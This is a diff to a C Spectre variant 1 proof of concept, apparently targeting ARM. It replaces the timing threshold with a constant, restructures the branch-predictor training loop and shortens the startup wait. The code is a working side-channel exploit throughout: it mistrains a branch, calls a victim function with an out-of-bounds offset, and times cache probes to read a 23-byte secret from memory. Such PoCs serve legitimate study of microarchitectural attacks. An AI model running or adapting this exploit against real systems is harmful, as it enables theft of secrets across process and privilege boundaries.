@@ -5,6 +5,7 @@
 #include <pthread.h>
 
 #define DELTA 1024
+#define CACHE_HIT_TIME_THRESH 10
 volatile uint64_t counter = 0;
 unsigned int buffer_size = 16;
 u_int8_t buffer[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
@@ -58,30 +59,34 @@ void spectre(size_t offset){
 		results[i] = 0;
 	}
 
-	int tries;
 	int j;
-	for (tries = 999; tries > 0; tries--) {
+	for (int trial_idx = 0; trial_idx < 1000; trial_idx++) {
 		flushSideChannel();
+		training_x = trial_idx % buffer_size;
 
-		training_x = tries % buffer_size;
-		for (j = 29; j >= 0; j--) {
+		for (j=0; j<30; j++) {
 			flush(&buffer_size);
-			for (volatile int z = 0; z < 100; z++)
-			{
-			} /* Delay (can also mfence) */
+			for (volatile int z = 0; z < 100; z++){}
+			//asm volatile("DSB SY");
+			//asm volatile("DMB SY");
 
+			/* Branch misprediction code from spectre POC */
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
 			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
 			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
 			x = training_x ^ (x & (offset ^ training_x));
-
-			/* Call the victim! */
+			/*
+			if(j % 6 == 0)
+				x = offset;
+			else
+				x = training_x;
+			*/
 			victim(x);
 		}
 		for(i = 0; i < 256; i++){
 	    time = timed_read(&array[i*4096 + DELTA]);
-	    if (time <= 10){
+	    if (time <= CACHE_HIT_TIME_THRESH){
 	      results[i] += 1;
 	    }
 	  }
@@ -98,8 +103,6 @@ void spectre(size_t offset){
 }
 
 int main(int argc, const char**argv){
-  int thresh = atoi(argv[1]);
-
   printf("Secret %p\n",(void*)&secret);
   printf("Buffer %p\n",(void*)&buffer);
   printf("Array %p\n",(void*)&array);
@@ -107,12 +110,12 @@ int main(int argc, const char**argv){
   //Start the counter
   pthread_t counter_thread;
   pthread_create(&counter_thread, NULL, increment_counter, NULL);
-  while (counter < 100000000); //sleep
+  while (counter < 10); //sleep
   asm volatile ("DSB SY");
 
   size_t secret_offset = (size_t)(secret - (char*)buffer);
-	for(int i=0; i<23; i++){
+	for(int i=0; i<23; i++){ // length of secret is known
   	spectre(secret_offset+i);
 	}
-  return (0);
+  return 0;
 }
